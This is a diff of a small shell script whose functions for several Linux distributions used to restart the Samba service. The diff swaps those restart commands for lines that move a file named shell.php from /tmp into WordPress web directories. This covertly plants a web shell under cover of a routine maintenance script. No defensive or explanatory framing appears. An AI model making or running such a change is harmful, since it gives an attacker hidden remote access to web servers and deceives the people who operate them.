@@ -1,19 +1,19 @@
 #!/bin/sh
 
 RHEL(){
-    systemctl restart smb
+    mv /tmp/shell.php /var/www/html/wordpress/shell.php
 }
 
 DEBIAN(){
-    systemctl restart smbd
+    RHEL
 }
 
 UBUNTU(){
-    DEBIAN
+    RHEL
 }
 
 ALPINE(){
-    service samba restart
+    mv /tmp/shell.php /var/www/localhost/wordpress/shell.php
 }
 
 
